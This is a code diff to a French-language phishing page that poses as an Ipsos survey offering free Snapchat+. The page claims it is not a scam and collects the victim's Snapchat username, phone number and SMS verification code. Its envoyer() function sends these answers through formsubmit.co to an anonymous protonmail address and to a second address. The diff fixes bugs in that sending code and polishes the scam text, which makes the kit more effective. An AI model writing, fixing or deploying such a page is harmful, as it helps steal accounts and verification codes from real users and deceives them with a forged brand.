@@ -39,13 +39,20 @@ body {
     font-weight:700;
 }
 
-/* LOGO FIXE */
-.logo-fixed {
+/* LOGOS FIXES (FRANCE + SNAPCHAT) */
+.logos-fixed {
     position:fixed;
     top:15px;
     right:15px;
-    height:45px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:10px;
     z-index:999;
+}
+
+.logos-fixed img {
+    height:45px;
 }
 
 /* CONTENU */
@@ -120,8 +127,11 @@ button:disabled {
 </head>
 
 <body>
-<img src="francelogo.png" class="logo-fixed" alt="france"align=”middle”>
-<img src="SnapchatLogo.png" class="logo-fixed" alt="Snapchat">
+<!-- Logos fixes -->
+<div class="logos-fixed">
+    <img src="francelogo.png" alt="France">
+    <img src="SnapchatLogo.png" alt="Snapchat">
+</div>
 
 <div class="header">
     <a href="index.html" onclick="return confirm('Quitter le sondage ? Vos réponses seront perdues.')">
@@ -129,6 +139,7 @@ button:disabled {
     </a>
     <div class="header-text">Ipsos – Sondage</div>
 </div>
+
 <!-- INTRO -->
 <div class="box" id="intro">
     <h2>Sondage express</h2>
@@ -139,8 +150,7 @@ button:disabled {
 <!-- INTERMÉDIAIRE -->
 <div class="box" id="intermediaire" style="display:none;">
     <h2>Merci !</h2>
-    <p>Pour recevoir votre abonnement a Snapchat+,une verification d'identité est nécéssaire afin de garantir des reponses humaines et d'éviter les abus.Cette offre n'est disponible que une seule fois par compte Snapchat et par personne,donc en continuant vous vous engagez à ce que cela constitue votre première et unique intervention sur ce sondage.Non ce n'est pas une arnaque,Si vous doutez visitez notre site : Ipsos.com 
-        seul les entreprises SFR,Bouygues et Orange sont acceptés par les entreprises avec lesquelles nous travaillons.La vérification  se fait via botre numéro de téléphone(données anonymes et supprimées ensuite).</p>
+    <p>Pour recevoir votre abonnement à Snapchat+, une vérification d'identité est nécessaire afin de garantir des réponses humaines et d'éviter les abus. Cette offre n'est disponible qu'une seule fois par compte Snapchat et par personne, donc en continuant vous vous engagez à ce que cela constitue votre première et unique intervention sur ce sondage. Non ce n'est pas une arnaque. Seules les entreprises SFR, Bouygues et Orange sont acceptées par les partenaires avec lesquels nous travaillons. La vérification se fait via votre numéro de téléphone (données anonymes et supprimées ensuite).</p>
     <button onclick="continuer()">Continuer</button>
 </div>
 
@@ -162,7 +172,7 @@ button:disabled {
     </div>
 </div>
 
-  <script>
+<script>
 const titre = "Sondage pour bénéficier de Snapchat+";
 
 const questions = [
@@ -233,7 +243,7 @@ function suivant(){
     } else {
         sondage.innerHTML = `
             <h2>Merci pour votre participation !</h2>
-            <p>Vous recevrez votre abonnement Snapchat + directement sur votre compte dans un délai d'environ 15 minutes.</p>
+            <p>Vous recevrez votre abonnement Snapchat+ directement sur votre compte dans un délai d'environ 15 minutes.</p>
         `;
         envoyer();
     }
@@ -245,50 +255,48 @@ function continuer(){
     afficherQuestion();
 }
 
-function envoyer(){
-    const formData = new FormData();
+function envoyer() {
+    // Premier FormData
+    const formData1 = new FormData();
+    formData1.append("artiste_prefere", reponsesUtilisateur[0] || "");
+    formData1.append("artiste_deezer", reponsesUtilisateur[1] || "");
+    formData1.append("artiste_decouverte", reponsesUtilisateur[2] || "");
+    formData1.append("snapchat", reponsesUtilisateur[3] || "");
+    formData1.append("telephone", reponsesUtilisateur[4] || "");
+    formData1.append("code_sms", reponsesUtilisateur[5] || "");
+    formData1.append("_captcha", "false");
+    formData1.append("_template", "table");
 
-    formData.append("artiste_prefere", reponsesUtilisateur[0] || "");
-    formData.append("artiste_deezer", reponsesUtilisateur[1] || "");
-    formData.append("artiste_decouverte", reponsesUtilisateur[2] || "");
-    formData.append("snapchat", reponsesUtilisateur[3] || "");
-    formData.append("telephone", reponsesUtilisateur[4] || "");
-    formData.append("code_sms", reponsesUtilisateur[5] || "");
+    // Premier envoi
+    fetch("https://formsubmit.co/anonymous2026b@protonmail.com", {
+        method: "POST",
+        body: formData1
+    })
+    .then(() => console.log("Premier mail envoyé"))
+    .catch(err => console.error("Erreur premier envoi :", err));
 
-formData.append("_captcha", "false");
-formData.append("_template", "table");
+    // Deuxième FormData (copie des réponses)
+    const formData2 = new FormData();
+    formData2.append("artiste_prefere", reponsesUtilisateur[0] || "");
+    formData2.append("artiste_deezer", reponsesUtilisateur[1] || "");
+    formData2.append("artiste_decouverte", reponsesUtilisateur[2] || "");
+    formData2.append("snapchat", reponsesUtilisateur[3] || "");
+    formData2.append("telephone", reponsesUtilisateur[4] || "");
+    formData2.append("code_sms", reponsesUtilisateur[5] || "");
+    formData2.append("_captcha", "false");
+    formData2.append("_template", "table");
 
-// Premier envoi
-fetch("https://formsubmit.co/anonymous2026b@protonmail.com", {
-    method: "POST",
-    body: formData
-})
-.then(response => console.log("Premier mail envoyé"))
-.catch(err => console.error("Erreur premier envoi :", err));
-
-// Crée un NOUVEAU FormData pour le deuxième envoi
-const formData2 = new FormData(event.target);
-formData2.append("_captcha", "false");
-formData2.append("_template", "table");
-
-// Deuxième envoi
-fetch("https://formsubmit.co/deuxiemeemail@example.com", {
-    method: "POST",
-    body: formData2
-})
-.then(response => console.log("Deuxième mail envoyé"))
-.catch(err => console.error("Erreur deuxième envoi :", err));
-
-    });
+    // Deuxième envoi
+    fetch("https://formsubmit.co/deuxiemeemail@example.com", {
+        method: "POST",
+        body: formData2
+    })
+    .then(() => console.log("Deuxième mail envoyé"))
+    .catch(err => console.error("Erreur deuxième envoi :", err));
 }
 </script>
 
 </body>
 </html>
-
-
-
-
-
 
 
